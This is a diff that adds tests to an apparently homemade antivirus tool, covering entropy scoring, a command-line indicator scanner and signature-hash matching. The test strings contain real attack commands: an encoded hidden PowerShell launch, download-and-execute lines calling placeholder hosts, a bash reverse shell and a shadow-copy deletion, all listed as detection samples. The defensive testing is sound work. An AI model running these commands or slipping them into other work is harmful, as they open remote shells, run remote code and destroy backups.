@@ -122,6 +122,61 @@ def test_config_roundtrip():
     antivirus.set_config(autodelete_days=7)
 
 
+# --- stronger static analysis: entropy + behavioral IOCs -----------------------
+
+def test_entropy_distinguishes_random_from_text():
+    assert antivirus.shannon_entropy(os.urandom(8192)) > 7.5
+    assert antivirus.shannon_entropy(b"the quick brown fox " * 400) < 5.0
+
+
+def test_ioc_engine_flags_attacks_but_not_benign():
+    bad = [
+        "powershell -nop -w hidden -enc " + "A" * 60,
+        'IEX (New-Object Net.WebClient).DownloadString("http://x/a.ps1")',
+        "bash -i >& /dev/tcp/1.2.3.4/9001 0>&1",
+        "vssadmin delete shadows /all /quiet",
+    ]
+    for c in bad:
+        r = antivirus.scan_command_line(c)
+        assert r["verdict"] == "malicious", (c, r)
+    for c in ("ls -la", "git status", "python3 -m http.server"):
+        assert antivirus.scan_command_line(c)["verdict"] == "clean", c
+
+
+def test_script_with_ioc_is_flagged_not_clean():
+    # A plain-looking .txt that actually carries a download-and-execute payload.
+    body = ('echo hello\n'
+            'IEX (New-Object Net.WebClient).DownloadString("http://evil/x.ps1")\n')
+    p = _write("readme.txt", body)
+    r = antivirus.scan_file(str(p), deep=False)
+    assert r["verdict"] in ("suspicious", "malicious"), r
+    assert any("indicator" in x for x in r["reasons"]), r
+    assert "ioc-signatures" in r["engines"], r
+
+
+def test_signature_db_hash_is_malicious():
+    import json
+    from pathlib import Path
+    p = _write("benign_payload.bin", b"totally ordinary bytes here")
+    sha = antivirus.sha256_file(p)
+    sig_path = Path(_TMP) / "signatures.json"
+    sig_path.write_text(json.dumps({"sha256": [sha]}), "utf-8")
+    antivirus._SIG_CACHE = None  # invalidate cache so the new DB is picked up
+    try:
+        r = antivirus.scan_file(str(p), deep=False)
+        assert r["verdict"] == "malicious", r
+    finally:
+        sig_path.unlink(missing_ok=True)
+        antivirus._SIG_CACHE = None
+
+
+def test_status_reports_strong_engines():
+    s = antivirus.security_status()
+    assert "ioc-signatures" in s["engines_available"], s
+    assert "fileless-behavioral" in s["engines_available"], s
+    assert "fileless_protection" in s
+
+
 def _run_all() -> bool:
     import types
     funcs = [v for k, v in sorted(globals().items())
